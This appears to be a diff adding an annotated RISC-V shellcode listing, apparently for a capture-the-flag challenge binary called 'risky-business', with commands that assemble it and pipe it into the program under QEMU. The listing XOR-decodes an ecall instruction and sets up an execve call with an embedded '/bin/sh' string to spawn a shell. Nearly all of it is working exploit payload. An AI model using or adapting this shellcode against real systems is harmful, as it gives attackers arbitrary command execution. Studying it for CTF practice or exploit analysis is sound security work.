@@ -1,0 +1,25 @@
+        // cuts -f1 < shellcode.txt |xxd -p -r > /tmp/shellcode.bin && riscv64-elf-objdump -mriscv:rv64 -bbinary -D /tmp/shellcode.bin
+        // (/bin/cat  /tmp/shellcode.bin -) | qemu-riscv64 -strace -E LD_LIBRARY_PATH=. ./ld-linux-riscv64-lp64d.so.1 ./risky-business
+13858703        addi a0, a5, 0x38=56[00]
+8145            li a1, 0            [04]
+1388f5ff        addi a6, a1, -1     [06]
+
+83b8c703        ld a7, 0x3c=60(a5)  [0a]
+b3c60801        xor a3, a6, a7      [0e]
+23bed702        sd a3, 60(a5)       [12]
+
+83b80703        ld a7, 0x30=48(a5)  [16] // a3 = 0x73
+b3481801        xor a7, a6, a7      [1a]
+23b81703        sd a7, 48(a5)       [1e]
+
+9388a806        addi a7,a7,106      [22] // compute 0xdd = 0x73 + 106
+
+63920501        bne a1,a6,(.+4)     [2a] // Flush i-cache in QEMU
+63920501                                 // (SYNC again; useless but enabled working with some air)
+
+0146            li a2, 0            [2e]
+
+8cffffff                73000000    [30] // ecall: 73000000
+22ffffff                dd000000    [34] // syscall number
+2f62696ed08c97ff                    [38] // /bin/sh\0
+ffff                                     // padding
